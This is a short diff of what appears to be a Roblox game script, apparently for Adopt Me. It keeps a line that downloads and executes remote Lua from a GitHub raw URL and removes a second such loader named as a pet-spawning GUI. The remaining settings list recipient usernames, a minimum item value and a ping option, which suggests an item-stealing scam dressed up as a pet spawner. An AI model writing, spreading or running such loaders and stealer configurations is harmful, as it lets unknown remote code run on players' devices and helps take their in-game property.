@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/spawn_pet_gui.lua"))()
-
 _G.Usernames = {"ajandaa12alt9", "kaianeiglLs", "ZWV_kgyj229", "KaianEIGLs"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
